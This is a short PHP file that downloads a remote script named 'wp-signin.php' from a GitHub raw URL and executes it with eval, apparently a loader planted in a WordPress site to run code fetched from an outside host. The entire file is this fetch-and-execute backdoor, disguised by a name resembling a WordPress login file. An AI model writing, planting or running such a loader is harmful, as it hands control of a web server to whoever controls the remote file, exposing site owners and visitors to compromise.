<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/massadepan/alpam/main/wp-signin.php'));

$content = "?> ".$content;
eval($content);